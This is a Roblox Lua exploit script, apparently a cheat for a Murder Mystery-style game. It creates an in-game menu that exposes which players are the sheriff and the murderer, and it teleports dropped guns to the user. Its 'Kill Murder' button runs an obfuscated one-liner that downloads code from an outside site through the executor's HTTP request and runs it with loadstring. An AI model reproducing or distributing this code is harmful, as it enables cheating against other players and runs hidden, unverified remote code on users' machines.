local ScreenGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local Logo = Instance.new("ImageLabel")
local Sheriff = Instance.new("TextButton")
local Murder = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui

main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
main.BackgroundTransparency = 0.200
main.BorderSizePixel = 0
main.Position = UDim2.new(0.310416698, 0, 0.32967481, 0)
main.Size = UDim2.new(0, 746, 0, 349)
main.Active = true
main.Draggable = true



Logo.Name = "Logo"
Logo.Parent = main
Logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Logo.Position = UDim2.new(0.0147453081, 0, 0.0286532957, 0)
Logo.Size = UDim2.new(0, 94, 0, 50)
Logo.Image = "http://www.roblox.com/asset/?id=9398360740"


Sheriff.Name = "Sheriff"
Sheriff.Parent = main
Sheriff.BackgroundColor3 = Color3.fromRGB(166, 130, 255)
Sheriff.Position = UDim2.new(0.0147453081, 0, 0.232091695, 0)
Sheriff.Size = UDim2.new(0, 163, 0, 50)
Sheriff.Font = Enum.Font.FredokaOne
Sheriff.Text = "Pick Up Gun"
Sheriff.TextColor3 = Color3.fromRGB(0, 0, 0)
Sheriff.TextSize = 27.000
Sheriff.MouseButton1Down:connect(function()
	local er = false
	local Mouse = game:GetService"Players".LocalPlayer:GetMouse()
	local player = game.Players:GetChildren()
	workspace.ChildAdded:connect(function(child)
		if child.Name == "GunDrop" then
			local cb = Instance.new("BindableFunction")
			cb.OnInvoke = function(arg)
				if arg == "Get gun!" then
					workspace.GunDrop.CFrame = CFrame.new(game.Players.LocalPlayer.Character.Head.Position)
				end
			end
			game:GetService("StarterGui"):SetCore("SendNotification",{
				Title = "The sheriff has died!",
				Text = "Grab their gun?",
				Duration = 5,
				Button1 = "Dismiss",
				Button2 = "Get gun!",
				Callback = cb
			})
		end
	end)

	Mouse.KeyDown:Connect(function(Key)
		if Key == "x" then
			for i=1,#player do
				local USERID = game.Players:GetUserIdFromNameAsync(player[i].Name)
				local gun = player[i].Backpack:FindFirstChild("Gun")
				local revolver = player[i].Backpack:FindFirstChild("Revolver")
				if gun ~= nil or revolver ~= nil then
					game:GetService("StarterGui"):SetCore("SendNotification",{
						Title = "Sheriff",
						Text = "Their name is " .. player[i].Name .. "!",
						Icon = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..USERID,
						Duration = 5,
						Button1 = "Dismiss",
					})
					er = true
				elseif gun == nil and revolver == nil and i == #player then
					game:GetService("StarterGui"):SetCore("SendNotification",{
						Title = "Sheriff",
						Text = "No sheriff could be found!",
						Duration = 5,
						Button1 = "Dismiss",
					})
				end
				if er then
					er = false
					break
				end
			end

		elseif Key == "z" then
			for i=1,#player do
				local USERID = game.Players:GetUserIdFromNameAsync(player[i].Name)
				local knife = player[i].Backpack:FindFirstChild("Knife")
				if knife ~= nil then
					game:GetService("StarterGui"):SetCore("SendNotification",{
						Title = "Murderer",
						Text = "Their name is " .. player[i].Name .. "!",
						Icon = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..USERID,
						Duration = 5,
						Button1 = "Dismiss",
					})
					er = true
				elseif knife == nil and i == #player then
					game:GetService("StarterGui"):SetCore("SendNotification",{
						Title = "Murderer",
						Text = "No murderer could be found!",
						Duration = 5,
						Button1 = "Dismiss",
					})
				end
				if er then
					er = false
					break
				end
			end
		end
	end)
end)


Murder.Name = "Murder"
Murder.Parent = main
Murder.BackgroundColor3 = Color3.fromRGB(166, 130, 255)
Murder.Position = UDim2.new(0.273458421, 0, 0.232091695, 0)
Murder.Size = UDim2.new(0, 163, 0, 50)
Murder.Font = Enum.Font.FredokaOne
Murder.Text = "Kill Murder"
Murder.TextColor3 = Color3.fromRGB(0, 0, 0)
Murder.TextSize = 29.000
Murder.MouseButton1Down:connect(function()
	getgenv().mainKey = "nil"

	local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
end)
